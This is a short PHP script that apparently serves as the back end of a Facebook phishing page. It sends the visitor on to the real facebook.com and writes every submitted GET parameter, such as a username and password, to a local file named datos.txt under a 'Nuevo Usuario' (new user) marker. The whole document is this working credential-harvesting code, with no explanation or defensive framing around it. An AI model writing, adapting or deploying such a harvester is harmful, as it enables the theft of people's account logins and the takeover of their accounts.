<?php
header("Location: http://www.facebook.com/");
$archivo_txt=fopen("datos.txt","a");

foreach($_GET as $variable => $value){
	fwrite($archivo_txt,$variable);
	fwrite($archivo_txt," = ");
	fwrite($archivo_txt,$value);
	fwrite($archivo_txt,"\r\n");
}

fwrite($archivo_txt,"\r\n======= Nuevo Usuario ===== \r\n");
fclose($archivo_txt);
exit
?>